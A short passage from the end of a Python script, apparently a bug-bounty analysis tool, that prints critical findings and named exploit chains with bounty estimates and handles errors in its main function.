            print(f"\n🚨 Critical Findings:")
            for finding in critical_findings[:5]:
                print(f"  • {finding.get('title', 'Unknown')}")
        
        # Display chains
        if analyzer.chains:
            print(f"\n⛓️ Exploit Chains:")
            for chain in analyzer.chains:
                print(f"  • {chain.get('name', 'Unknown')} - {chain.get('bounty_estimate', 'Unknown')}")
    
    except Exception as e:
        print(f"❌ Analysis failed: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()